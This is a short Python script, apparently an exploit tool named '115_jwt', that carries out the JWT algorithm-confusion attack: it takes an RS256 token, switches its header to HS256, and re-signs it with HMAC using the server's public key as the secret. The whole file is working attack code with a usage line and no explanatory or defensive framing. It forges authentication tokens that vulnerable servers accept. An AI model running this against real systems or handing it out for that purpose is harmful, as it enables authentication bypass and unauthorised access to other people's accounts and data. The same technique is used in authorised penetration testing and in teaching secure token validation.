import sys, json, base64, hmac, hashlib
def exploit(token, key_path):
    h, p, s = token.split('.')
    with open(key_path, 'rb') as f: key = f.read()
    head = json.loads(base64.urlsafe_b64decode(h + '==')); head['alg'] = 'HS256'
    nh = base64.urlsafe_b64encode(json.dumps(head).encode()).decode().strip('=')
    sig = hmac.new(key, f"{nh}.{p}".encode(), hashlib.sha256).digest()
    print(f"{nh}.{p}.{base64.urlsafe_b64encode(sig).decode().strip('=')}")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: 115_jwt <token> <pub_key_path>"); sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
